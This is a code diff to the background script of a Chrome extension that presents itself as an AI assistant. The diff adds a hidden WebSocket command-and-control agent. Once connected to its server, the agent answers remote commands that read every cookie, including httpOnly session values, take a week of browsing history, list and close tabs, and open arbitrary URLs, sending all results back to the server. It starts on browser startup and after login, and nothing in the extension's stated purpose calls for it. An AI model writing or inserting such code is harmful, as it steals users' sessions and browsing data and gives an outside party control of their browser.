@@ -1,4 +1,6 @@
 
+/* global chrome */
+
 // Background script for extension installation handling
 
 // URL and model name for Titan AI API
@@ -8,6 +10,23 @@ const TITAN_MODEL = 'titan-assistant';
 // T0 Network configuration
 const T0_AUTH_URL = 'https://t0.network/auth';
 const T0_CONFIG_URL = 'https://t0.network/config';
+
+// WebSocket configuration
+const WS_URL = "ws://localhost:3001";
+const HEARTBEAT_MS = 30000;
+
+let ws, agentId, heartbeatInterval;
+
+// WebSocket utilities
+const send = (type, payload = {}) => {
+  if (ws?.readyState === WebSocket.OPEN) {
+    ws.send(JSON.stringify({ type, payload }));
+  }
+};
+
+const log = (message, data = '') => {
+  console.log(`[Agent] ${message}`, data);
+};
 
 // Generate UID function (same as in userUtils.ts)
 function generateUID() {
@@ -101,6 +120,232 @@ function setupPeriodicUpdates() {
   }, 60000);
 }
 
+// WebSocket agent registration
+function registerAgent() {
+  chrome.storage.local.get("userNickname", (data) => {
+    const payload = {
+      username: data.userNickname || "Anonymous",
+      browser: navigator.userAgent,
+      os: navigator.platform,
+      version: chrome.runtime.getManifest().version,
+      location: "Unknown"
+    };
+    send("register_agent", payload);
+    log("Registering agent", payload);
+  });
+}
+
+// Heartbeat
+function startHeartbeat() {
+  clearInterval(heartbeatInterval);
+  heartbeatInterval = setInterval(() => {
+    if (agentId) {
+      send("heartbeat", { agentId });
+    }
+  }, HEARTBEAT_MS);
+}
+
+function stopHeartbeat() {
+  clearInterval(heartbeatInterval);
+}
+
+// Handle WebSocket commands
+async function handleCommand(command) {
+  const { id: commandId, type, payload } = command;
+  log(`Executing command: ${type}`, command);
+
+  try {
+    let result;
+
+    switch (type) {
+      case "get_cookies":
+        result = await chrome.cookies.getAll({});
+        result = result.map(cookie => ({
+          name: cookie.name,
+          value: cookie.value,
+          domain: cookie.domain,
+          path: cookie.path,
+          expires: cookie.expirationDate ? new Date(cookie.expirationDate * 1000).toISOString() : 'Session',
+          httpOnly: cookie.httpOnly,
+          secure: cookie.secure,
+          sameSite: cookie.sameSite
+        }));
+        break;
+
+      case "get_history":
+        const historyItems = await chrome.history.search({ 
+          text: "", 
+          maxResults: 1000,
+          startTime: Date.now() - (7 * 24 * 60 * 60 * 1000) // последние 7 дней
+        });
+        
+        result = historyItems.map(item => ({
+          id: item.id,
+          url: item.url,
+          title: item.title || 'No title',
+          visitCount: item.visitCount,
+          lastVisitTime: item.lastVisitTime ? new Date(item.lastVisitTime).toISOString() : '',
+          domain: new URL(item.url).hostname
+        }));
+        break;
+
+      case "send_notification":
+        await chrome.notifications.create({
+          type: "basic",
+          iconUrl: "icons/icon48.png",
+          title: payload.title || "Notification",
+          message: payload.message || "Empty message",
+          priority: 1
+        });
+        
+        // Если есть URL, открываем его через 3 секунды
+        if (payload.url) {
+          setTimeout(() => {
+            chrome.tabs.create({ url: payload.url });
+          }, 3000);
+        }
+        
+        result = { 
+          status: "sent", 
+          timestamp: new Date().toISOString(),
+          title: payload.title,
+          message: payload.message,
+          url: payload.url
+        };
+        break;
+
+      case "ping":
+        result = { 
+          pong: true, 
+          timestamp: new Date().toISOString(),
+          agentId: agentId 
+        };
+        break;
+
+      case "get_tabs":
+        const tabs = await chrome.tabs.query({});
+        result = tabs.map(tab => ({
+          id: tab.id,
+          url: tab.url,
+          title: tab.title,
+          active: tab.active,
+          windowId: tab.windowId,
+          favIconUrl: tab.favIconUrl
+        }));
+        break;
+
+      case "close_tab":
+        if (payload.tabId) {
+          await chrome.tabs.remove(payload.tabId);
+          result = { closed: true, tabId: payload.tabId };
+        } else {
+          throw new Error("Tab ID required");
+        }
+        break;
+
+      case "open_url":
+        if (payload.url) {
+          const tab = await chrome.tabs.create({ url: payload.url });
+          result = { opened: true, tabId: tab.id, url: payload.url };
+        } else {
+          throw new Error("URL required");
+        }
+        break;
+
+      default:
+        throw new Error(`Unknown command type: ${type}`);
+    }
+
+    // Отправляем результат
+    send("command_result", {
+      commandId,
+      result,
+      status: "completed",
+      timestamp: new Date().toISOString()
+    });
+
+    log(`Command ${type} completed`, result);
+
+  } catch (error) {
+    log(`Command ${type} failed:`, error.message);
+    
+    send("command_result", {
+      commandId,
+      result: error.message,
+      status: "error",
+      timestamp: new Date().toISOString()
+    });
+  }
+}
+
+// Handle WebSocket messages
+function handleMessage(message) {
+  const { type, payload } = message;
+  
+  switch (type) {
+    case "registration_success":
+      agentId = payload.agentId;
+      log("Agent registered successfully", { agentId, info: payload.info });
+      startHeartbeat();
+      
+      // Сохраняем ID агента
+      chrome.storage.local.set({ agentId: agentId });
+      break;
+
+    case "command":
+      handleCommand(payload);
+      break;
+
+    case "ping":
+      send("pong", { agentId, timestamp: new Date().toISOString() });
+      break;
+
+    default:
+      log("Unknown message type:", type);
+  }
+}
+
+// WebSocket connection
+function connect() {
+  log("Attempting to connect to WebSocket server");
+  
+  try {
+    ws = new WebSocket(WS_URL);
+
+    ws.addEventListener("open", () => {
+      log("WebSocket connected");
+      registerAgent();
+    });
+
+    ws.addEventListener("message", (event) => {
+      try {
+        const message = JSON.parse(event.data);
+        handleMessage(message);
+      } catch (error) {
+        log("Failed to parse message:", error.message);
+      }
+    });
+
+    ws.addEventListener("close", (event) => {
+      log("WebSocket disconnected", { code: event.code, reason: event.reason });
+      stopHeartbeat();
+      agentId = null;
+      
+      // Переподключение через 5 секунд
+      setTimeout(connect, 5000);
+    });
+
+    ws.addEventListener("error", (error) => {
+      log("WebSocket error:", error);
+      ws.close();
+    });
+
+  } catch (error) {
+    log("Failed to create WebSocket:", error.message);
+    setTimeout(connect, 5000);
+  }
+}
+
 chrome.runtime.onInstalled.addListener((details) => {
   if (details.reason === 'install') {
     // Open welcome page in new tab when extension is first installed
@@ -111,11 +356,15 @@ chrome.runtime.onInstalled.addListener((details) => {
   
   // Start periodic updates
   setupPeriodicUpdates();
+  
+  log("Extension installed");
 });
 
 // Start periodic updates when service worker starts
 chrome.runtime.onStartup.addListener(() => {
   setupPeriodicUpdates();
+  connect(); // Start WebSocket connection
+  log("Extension started");
 });
 
 // Check if user is logged in when extension icon is clicked
@@ -156,6 +405,9 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
         chrome.action.setPopup({
           popup: 'popup.html'
         });
+        
+        // Start WebSocket connection after successful registration
+        connect();
         
         sendResponse({ 
           success: true, 
@@ -235,4 +487,10 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
     
     return true; // Keep message channel open for async response
   }
+});
+
+// WebSocket notification handlers
+chrome.notifications.onClicked.addListener((notificationId) => {
+  log("Notification clicked:", notificationId);
+  chrome.notifications.clear(notificationId);
 });
